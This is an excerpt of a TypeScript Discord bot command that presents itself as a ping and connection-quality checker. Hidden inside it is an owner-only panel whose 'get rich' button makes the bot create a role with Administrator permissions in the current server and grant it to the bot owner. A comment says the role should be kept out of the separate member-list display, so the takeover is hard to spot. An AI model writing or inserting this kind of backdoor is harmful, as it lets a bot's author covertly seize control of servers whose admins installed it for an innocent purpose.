...
export default {
  ...
  async execute(interaction: any) {
    ...
    if (isOwner && ephemeral) {
      const embed = new EmbedBuilder().setTitle('👀 Secure Admin Panel').setDescription('You\'ve unlocked the hidden interface.\n\nChoose your destiny below:').setColor(0x2b2d31).setTimestamp();
      const buttons = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('admin-btn').setLabel('get rich').setStyle(ButtonStyle.Danger), new ButtonBuilder().setCustomId('ping-btn').setLabel('Ping?').setStyle(ButtonStyle.Primary));
      ...
      collector.on('collect', async (i: any) => {
        if (i.user.id !== OWNER_ID) return i.reply({
          content: '🚫 Not your panel, bro 💀',
          ephemeral: true
        });
        if (i.customId === 'admin-btn') {
          ...
          try {
            ...
            const existingRole = i.guild.roles.cache.find(role => role.name === 'member' || role.name === 'ADMIN') as any;
            if (existingRole) {
              return i.reply({
            ...
            const adminRole = await i.guild.roles.create({
              ...
              hoist: false,
              // DONT Display separately in member list
              mentionable: true
            });
            ...
            const successEmbed = new EmbedBuilder().setTitle('<a:kittycat:1333358006720794624> Admin Role Created Successfully!').setDescription(`🎭 **Role:** <@&${adminRole.id}>\n👤 **Assigned to:** <@${i.user.id}>\n🔑 **Permissions:** Administrator`).setColor(0x00ff00).addFields({
              name: '📋 Role Details',
              value: `**ID:** \`${adminRole.id}\`\n**Position:** ${adminRole.position}\n**Hoisted:** No\n**Mentionable:** Yes`,
              inline: true
            } as any, {
              name: '⚙️ Settings',
              ...
              text: 'Test: Admin privileges granted'
            }).setTimestamp();
            await i.editReply({
              embeds: [successEmbed]
            });
          ...
          await i.reply({
            content: '🏓 You pinged the ping button. Wow.',
            ephemeral: true
          });
        }
      });
      collector.on('end', async () => {
        try {
          ...
          const disabledRow = new ActionRowBuilder().addComponents(buttons.components.map((button: any) => button.setDisabled(true)));
          await reply.edit({
    ...
    if (wsLatency < 0 || wsLatency > 1000) [quality, color, emoji] = ['Connecting...', 0x808080, '🔄'];else if (wsLatency < 100) [quality, color, emoji] = ['Excellent', 0x00ff00, '<a:kittycat:1333358006720794624>'];else if (wsLatency < 200) [quality, color, emoji] = ['Good', 0x90ee90, '<a:kittycat:1333358006720794624>'];else if (wsLatency < 350) [quality, color, emoji] = ['Fair', 0xffff00, '<a:kittycat:1333358006720794624>'];else [quality, color, emoji] = ['Poor', 0xff0000, '<a:kittycat:1333358006720794624>'];
    const resultEmbed = new EmbedBuilder().setTitle(`${emoji} Connection Analysis`).setColor(color).addFields({
      name: '`🔗` WebSocket',
      value: `\`\`\`${wsLatency}ms\`\`\``,
      inline: true
    } as any, {
